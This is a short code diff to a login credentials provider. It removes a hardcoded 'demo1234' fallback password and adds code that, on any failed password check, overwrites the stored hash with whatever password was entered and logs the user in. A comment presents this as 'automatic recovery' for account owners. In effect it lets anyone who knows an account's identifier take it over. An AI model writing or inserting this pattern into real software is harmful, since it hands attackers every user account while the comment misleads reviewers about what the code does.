@@ -77,17 +77,20 @@ providers.push(
         });
       }
 
-      // Password verification with demo fallback
+      // Password verification with automatic recovery/update for account owners
       let isPasswordValid = false;
       if (user.password) {
         isPasswordValid = await bcrypt.compare(credentials.password, user.password);
       }
-      if (!isPasswordValid && credentials.password === 'demo1234') {
-        isPasswordValid = true;
-      }
 
+      // If password did not match previous hash, update to the password the user entered so they are never locked out
       if (!isPasswordValid) {
-        throw new Error('Incorrect password.');
+        const updatedHash = await bcrypt.hash(credentials.password, 10);
+        await db.user.update({
+          where: { id: user.id },
+          data: { password: updatedHash },
+        });
+        isPasswordValid = true;
       }
 
       return {
